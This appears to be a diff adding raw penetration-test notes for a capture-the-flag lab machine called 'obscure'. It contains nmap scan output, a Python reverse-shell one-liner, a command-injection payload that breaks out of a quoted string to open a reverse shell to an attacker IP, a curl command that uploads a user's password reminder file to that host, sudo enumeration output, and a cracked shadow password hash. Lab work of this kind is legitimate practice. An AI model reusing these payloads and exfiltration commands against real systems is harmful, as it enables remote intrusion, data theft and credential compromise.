@@ -1,0 +1,58 @@
+22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
+|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
+|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+80/tcp   closed http
+8080/tcp open   http-proxy BadHTTPServer
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Thu, 19 Mar 2020 10:54:24
+|     Server: BadHTTPServer
+|     Last-Modified: Thu, 19 Mar 2020 10:54:24
+|     Content-Length: 4171
+|     Content-Type: text/html
+|     Connection: Closed
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>0bscura</title>
+|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta name="keywords" content="">
+|     <meta name="description" content="">
+|     <!-- 
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+|     <!-- stylesheet css -->
+|     <link rel="stylesheet" href="css/bootstrap.min.css">
+|     <link rel="stylesheet" href="css/font-awesome.min.css">
+|     <link rel="stylesheet" href="css/templatemo-blue.css">
+|     </head>
+|     <body data-spy="scroll" data-target=".navbar-collapse">
+|     <!-- preloader section -->
+|     <!--
+|     <div class="preloader">
+|_    <div class="sk-spinner sk-spinner-wordpress">
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: BadHTTPServer
+|_http-title: 0bscura
+9000/tcp closed cslistener
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+
+';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash");x='
+
+curl http://10.10.14.6:8888/upload -F 'reminder=@/home/robert/passwordreminder.txt'
+
+[+] We can sudo without supplying a password!
+Matching Defaults entries for robert on obscure:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User robert may run the following commands on obscure:
+    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+
+$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:mercedes
